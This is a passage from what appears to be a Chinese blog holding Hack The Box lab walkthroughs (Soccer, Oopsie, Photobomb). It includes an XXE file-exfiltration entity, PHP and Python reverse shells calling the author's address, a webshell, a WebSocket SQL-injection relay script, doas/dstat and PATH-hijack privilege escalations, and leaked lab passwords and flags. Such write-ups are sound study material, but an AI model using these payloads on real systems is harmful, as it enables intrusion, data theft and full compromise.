&quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.16.8:9999/?p=%file;&#39;&gt;&quot; &gt;\n\n上传payload.waf,回显\n[Sat Feb 11 04:31:10 2023] 10.10.11.186:60128 Closing\n[Sat Feb 11 04:31:12 2023] 10.10.11.186:53418 Accepted\n[Sat Feb 11 04:31:13 2023] 10.10.11.186:53418 [200]: GET /dedsec.dtd\n[Sat Feb 11 04:31:13 2023] 10.10.11.186:53418 Closing\n[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 Accepted\n[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 [200]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==                                                                                                                             \n[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 Closing\n\nbase64解码\n┌──(root💀kali)-[~]\n└─# echo &quot;PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==&quot; |base64 -d\n&lt;?php\n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 \n?&gt; \n\n上传时，注意，我们只在&#x2F;tiny&#x2F;uploads目录下有写入权限\n\n命令执行成功\n接下来就可以上传一个反弹shell的文件\n┌──(root💀kali)-[~/桌面]\n└─# cat n3ym4r.php                                                                                           \n&lt;?php\nsystem(&quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.16.8/6666&lt;&amp;1&#39;&quot;)\n?&gt;\n\nnc监听\n┌──(root💀kali)-[~]\n└─# nc -lvvp 6666            \nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::6666\nNcat: Listening on 0.0.0.0:6666\nxzc\nls\nNcat: Connection from 10.10.11.194.\nNcat: Connection from 10.10.11.194:47232.\nbash: cannot set terminal process group (1044): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@soccer:~/html/tiny/uploads$ ls\nn3ym4r.php\n\n子域名发现反弹成功，到处查看文件\nwww-data@soccer:/etc$ cd ..\ncd ..\nwww-data@soccer:/$ cat /etc/hosts\ncat /etc/hosts\n127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb\n\n127.0.1.1       ubuntu-focal    ubuntu-focal\n\n在&#x2F;etc&#x2F;hosts文件发现，还绑定了一个子域名，将他加入本地&#x2F;etc&#x2F;hosts，访问\n\n&lt;script&gt;\n        var ws = new WebSocket(&quot;ws://soc-player.soccer.htb:9091&quot;);\n        window.onload = function () &#123;\n        \n        var btn = document.getElementById(&#39;btn&#39;);\n        var input = document.getElementById(&#39;id&#39;);\n        \n        ws.onopen = function (e) &#123;\n            console.log(&#39;connected to the server&#39;)\n        &#125;\n        input.addEventListener(&#39;keypress&#39;, (e) =&gt; &#123;\n            keyOne(e)\n        &#125;);\n        \n        function keyOne(e) &#123;\n            e.stopPropagation();\n            if (e.keyCode === 13) &#123;\n                e.preventDefault();\n                sendText();\n            &#125;\n        &#125;\n        \n        function sendText() &#123;\n            var msg = input.value;\n            if (msg.length &gt; 0) &#123;\n                ws.send(JSON.stringify(&#123;\n                    &quot;id&quot;: msg\n                &#125;))\n            &#125;\n            else append(&quot;????????&quot;)\n        &#125;\n        &#125;\n        \n        ws.onmessage = function (e) &#123;\n        append(e.data)\n        &#125;\n        \n        function append(msg) &#123;\n        let p = document.querySelector(&quot;p&quot;);\n        // let randomColor = &#39;#&#39; + Math.floor(Math.random() * 16777215).toString(16);\n        // p.style.color = randomColor;\n        p.textContent = msg\n        &#125;\n    &lt;/script&gt;\n\n该代码在 URL “ws:&#x2F;&#x2F;soc-player.soccer.htb:9091” 处建立到服务器的新 WebSocket 连接。加载页面时，它会设置一个事件侦听器，用于当用户在 ID 为“id”的输入元素中按下“Enter”键时。当按下“Enter”键时，调用函数“sendText”。 “sendText”函数用于通过 WebSocket 连接向服务器发送消息。该消息由一个 JSON 对象组成，该对象具有单个属性“id”和一个等于输入元素值的值。该代码还有一个名为“append”的函数，当 WebSocket 连接从服务器接收到消息时调用该函数.该函数将消息作为参数并将“p”元素的文本内容设置为消息。\n输入参数可能容易受到 sqli 注入攻击,google一下\nwebsocket sql注入漏洞利用\nhttps://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html\n链接内容讲的很清楚，这里不再赘述，将脚本的内容做些必要的更改,将ws_server和data参数进行修改\nfrom http.server import SimpleHTTPRequestHandler\nfrom socketserver import TCPServer\nfrom urllib.parse import unquote, urlparse\nfrom websocket import create_connection\n\nws_server = &quot;ws://soc-player.soccer.htb:9091&quot;\n\ndef send_ws(payload):\n    ws = create_connection(ws_server)\n    # If the server returns a response on connect, use below line\t\n    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here\n    \n    # For our case, format the payload in JSON\n    message = unquote(payload).replace(&#39;&quot;&#39;,&#39;\\&#39;&#39;) # replacing &quot; with &#39; to avoid breaking JSON structure\n    data = &#39;&#123;&quot;id&quot;:&quot;%s&quot;&#125;&#39; % message\n\n    ws.send(data)\n    resp = ws.recv()\n    ws.close()\n\n    if resp:\n        return resp\n    else:\n        return &#39;&#39;\n\ndef middleware_server(host_port,content_type=&quot;text/plain&quot;):\n\n    class CustomHandler(SimpleHTTPRequestHandler):\n        def do_GET(self) -&gt; None:\n            self.send_response(200)\n            try:\n                payload = urlparse(self.path).query.split(&#39;=&#39;,1)[1]\n            except IndexError:\n                payload = False\n                \n            if payload:\n                content = send_ws(payload)\n            else:\n                content = &#39;No parameters specified!&#39;\n\n            self.send_header(&quot;Content-type&quot;, content_type)\n            self.end_headers()\n            self.wfile.write(content.encode())\n            return\n\n    class _TCPServer(TCPServer):\n        allow_reuse_address = True\n\n    httpd = _TCPServer(host_port, CustomHandler)\n    httpd.serve_forever()\n\n\nprint(&quot;[+] Starting MiddleWare Server&quot;)\nprint(&quot;[+] Send payloads in http://localhost:8081/?id=*&quot;)\n\ntry:\n    middleware_server((&#39;0.0.0.0&#39;,8081))\nexcept KeyboardInterrupt:\n    pass\n\n开个终端执行此脚本，另开一终端对托管到8081的的中间服务器执行sqlmap\n┌──(root💀kali)-[~]\n└─# sqlmap -u &quot;http://localhost:8081/?id=1&quot; -p &quot;id&quot; --dbs\n        ___\n       __H__\n ___ ___[&quot;]_____ ___ ___  &#123;1.7#stable&#125;\n|_ -| . [&quot;]     | .&#39;| . |\n|___|_  [&quot;]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n由于是sql盲注，所以等待时间稍微有点长\navailable databases [5]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] soccer_db\n[*] sys\n\n[01:22:45] [INFO] fetched data logged to text files under &#39;/root/.local/share/sqlmap/output/localhost&#39;\n\n[*] ending @ 01:22:45 /2023-02-12/\n\n得到player:PlayerOftheMatch2022\nssh连接┌──(root💀kali)-[~]\n└─# ssh player@10.10.11.194\nThe authenticity of host &#39;10.10.11.194 (10.10.11.194)&#39; can&#39;t be established.\nECDSA key fingerprint is SHA256:Ke/TB8v0VkzfMGP9JasA7Vb22F4d1X6hyU/U5+8JKws.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added &#39;10.10.11.194&#39; (ECDSA) to the list of known hosts.\nplayer@10.10.11.194&#39;s password: \nWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Feb 12 06:10:09 UTC 2023\n\n  System load:           0.08\n  Usage of /:            70.6% of 3.84GB\n  Memory usage:          26%\n  Swap usage:            0%\n  Processes:             241\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.194\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:2be6\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Sat Feb 11 14:34:29 2023 from 10.10.14.154\nplayer@soccer:~$ ls\nlinpeas.sh  snap  user.txt\nplayer@soccer:~$ cat user.txt\n8cf79e0f16b3ea6d7a7f433dd606b117\n\n得到user flag\n提权执行sudo -l\nplayer@soccer:~$ sudo -l\n[sudo] password for player: \nSorry, user player may not run sudo on localhost.\n\n没有利用点\n尝试suid提权，执行find / -perm -4000 2&gt;/dev/null -ls\nplayer@soccer:~$ find / -perm -4000 2&gt;/dev/null -ls\n    70968     44 -rwsr-xr-x   1 root     root        42224 Nov 17 09:09 /usr/local/bin/doas\n    18263    140 -rwsr-xr-x   1 root     root       142792 Nov 28 04:55 /usr/lib/snapd/snap-confine\n     7696     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25 13:09 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n    14300    464 -rwsr-xr-x   1 root     root         473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign\n    16207     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1\n     7700     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device\n     1753     40 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /usr/bin/umount\n     2093     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount\n     1752     56 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /usr/bin/mount\n     1647     68 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /usr/bin/su\n    13720     44 -rwsr-xr-x   1 root     root          44784 Nov 29 11:53 /usr/bin/newgrp\n     3023     84 -rwsr-xr-x   1 root     root          85064 Nov 29 11:53 /usr/bin/chfn\n     1724    164 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /usr/bin/sudo\n     3027     68 -rwsr-xr-x   1 root     root          68208 Nov 29 11:53 /usr/bin/passwd\n     3026     88 -rwsr-xr-x   1 root     root          88464 Nov 29 11:53 /usr/bin/gpasswd\n     3024     52 -rwsr-xr-x   1 root     root          53040 Nov 29 11:53 /usr/bin/chsh\n     2242     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at\n      135    121 -rwsr-xr-x   1 root     root         123560 Nov 25 17:29 /snap/snapd/17883/usr/lib/snapd/snap-confine\n      814     84 -rwsr-xr-x   1 root     root          85064 Mar 14  2022 /snap/core20/1695/usr/bin/chfn\n      820     52 -rwsr-xr-x   1 root     root          53040 Mar 14  2022 /snap/core20/1695/usr/bin/chsh\n      889     87 -rwsr-xr-x   1 root     root          88464 Mar 14  2022 /snap/core20/1695/usr/bin/gpasswd\n      973     55 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /snap/core20/1695/usr/bin/mount\n      982     44 -rwsr-xr-x   1 root     root          44784 Mar 14  2022 /snap/core20/1695/usr/bin/newgrp\n      997     67 -rwsr-xr-x   1 root     root          68208 Mar 14  2022 /snap/core20/1695/usr/bin/passwd\n     1107     67 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /snap/core20/1695/usr/bin/su\n     1108    163 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /snap/core20/1695/usr/bin/sudo\n     1166     39 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /snap/core20/1695/usr/bin/umount\n     1255     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25 13:09 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n     1627    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1695/usr/lib/openssh/ssh-keysign\n\n具有 suid 权限的不寻常文件是 /usr/local/bin/doas\nGoogle一下doas\nhttps://underc0de.org/foro/gnulinux/doas-una-alternativa-a-sudo-simple-ligera-y-segura/#:~:text=doas%20es%20un%20programa%20para,espec%C3%ADficos%20para%20ejecutar%20comandos%20espec%C3%ADficos\n简单讲，doas 是一个以另一个用户身份运行命令的程序（类似于 sudo，但更简单），它的默认位置在“&#x2F;etc&#x2F;doas.conf”中\nplayer@soccer:~$ find / -name doas.conf 2&gt;/dev/null\n/usr/local/etc/doas.conf\nplayer@soccer:~$ cat /usr/local/etc/doas.conf\npermit nopass player as root cmd /usr/bin/dstat\n\n允许用户“player”使用 root 进行 dstat\n查看dstat官方文档\nhttps://github.com/dstat-real/dstat\nhttps://linux.die.net/man/1/dstat\n Dstat 允许运行自定义插件，我们可以创建一个插件并使用 dstat 运行它，名称必须为dstat_*.py，插件存放的目录为/usr/local/share/dstat/\n移动到此目录下，创建一个插件，写入代码\nimport os\nos.system(&quot;sh&quot;)\n\n执行此插件\nplayer@soccer:~$ cd /usr/local/share/dstat/\nplayer@soccer:/usr/local/share/dstat$ vim dstat_ahh.py\nplayer@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --ahh\n/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#39;s documentation for alternative uses\n  import imp\n# ls\ndstat_ahh.py\n# whoami\nroot\n# cat /root/root.txt\nfd1854e763db6cbf6e47036de2ad7bbf\n# \n\n得到root flag\n总结easy一共是五个靶机，之前已经打过一个了，这里就是剩下四个的全部流程。\n总体的大概流程为端口发现—&gt;80端口子域名枚举、目录扫描—&gt;web漏洞利用—&gt;拿到网站管理员权限—&gt;查找各种信息—&gt;拿到主机本地用户权限—&gt;提权到root\n中间还会穿插各种漏洞利用，总体思路就是网页权限—&gt;本地权限—&gt;root权限\n遇事不决就上Google，通过网页端获得的各种信息，如网站框架版本，服务器版本，google一下就能出来漏洞利用点以及各种exp，拿来就能用\n信息泄露方面，各种框架的默认密码、配置文件里的信息。配置文件的地址上官网就能找到\n提权方面，这里只用到了sudo滥用  suid两种Linux下的提权方式，可以上传一些检测脚本，自动收集能利用的提权点\n","tags":["打靶","HTB"]},{"title":"Oopsie靶机","url":"/2023/02/06/Oopsie%E9%9D%B6%E6%9C%BA/","content":"\n\n\nnmap端口扫描\n开了80web端口\n访问web\n惯例F12查看有没有什么信息\n\n看到一个像是登录地址的url路径，访问\n\n可以使用访问者身份登录\n点击account页面\n\n越权更改id,将id改为1时\n\n回显了admin账户的accessID\n点击uploads，发现需要superadmin用户权限\n\n抓包尝试伪造admin用户访问，看能不能上传文件\n\n将cookie中的user改为34322，role改为admin，访问成功，将数据包放出\n\n上传shell来到文件上传页面\n准备一个shell.php&lt;?php echo shell_exec($_GET[&#39;shell&#39;]);?&gt;,上传\n注意：上传文件时，也是需要将cookie修改为admin的\n\n上传成功后，访问&#x2F;uploads&#x2F;shell.php\n\n执行成功\n重新上传反弹shell的PHP代码\nwebshell在&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;文件夹下\n\n复制进bp，上传\n\nip端口改为自己ip和nc监听的端口\n\n\n找到user.txt拿到flag：f2c74ee8db7983851ab2a96a44eb7981\n\n在db.php中看到robert用户密码M3g4C0rpUs3r!  \n提权用 ls -lh $(find / -perm -u=s -type f 2&gt;/dev/null) 查看具有 SUID 的可执行文件\n\n执行 bugtracker，提示用户输入 Provide Bug ID，随意输入\n\n发现程序调用了cat，这个cat是root目录下的文件，有setuid权限，setuid是指赋予一个进程他所有者的权限，任意存取该文件的所有者能使用的全部系统资源。&#x2F;&#x2F;就是说你只要有权执行这个可执行文件，而这个文件里调用了只有root系统命令，那么执行的时候这个进程就相当于root\n这里我们就可以直接执行,在输入 Provide Bug ID时后面跟上;bin&#x2F;bash\n\n得到root权限下的shell\n\n得到rootflag：af13b0bee69f8a877c3faf667f7beacf\n //这里也可以采用另一种方法提权，程序调用了cat,我们可以自写一个cat，让程序调用我们自写的cat\n\nexport PATH=/tmp:$PATH //将/tmp目录设置为环境变量\ncd /tmp/ //切换到/tmp目录下\necho ‘/bin/sh’ &gt; cat //在此构造恶意的cat命令\nchmod +x cat  //设置优先级，会默认会执行我们创建的cat命令\n\n","tags":["打靶","HTB"]},{"title":"Photobomb靶机","url":"/2023/02/05/Photobomb%E9%9D%B6%E6%9C%BA/","content":"\n\n\nnmap扫描\n\n访问80端口网页，在此之前要先去host文件将ip域名绑定。\n\n下面有个点击按钮，弹出一个登录框\n\nF12,看到js文件信息泄露\n\n使用用户名密码登录\n\n是个图片下载站，可以下载文件，没信息抓个包\n\n可以看到有三个可控参数\n测试一下这些参数有没有命令注入，开一个监听\n\n测试到filetype参数时，成功。\n\n反弹shell\n利用shell生成网站生成\n\nexport RHOST=&quot;10.10.16.6&quot;;export RPORT=6666;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39;\n\n注意，放入bp时，需要把空格替换成+\n\n拿到普通用户shell\n\n拿到userflag：87ad4f92660fd0582bf4be5dee6c7bb2\n提权\n先查看当前用户能用sudo执行些什么\n\n有一个root权限的bash脚本，查看文件，功能为清理日志文件，获取日志文件并将其内容移动到photobomb.log.old然后使用truncate清除photobomb.log\n#!/bin/bash\n. /opt/.bashrc\ncd /home/wizard/photobomb\n\n# clean up log files\nif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]\nthen\n  /bin/cat log/photobomb.log &gt; log/photobomb.log.old\n  /usr/bin/truncate -s0 log/photobomb.log\nfi\n\n# protect 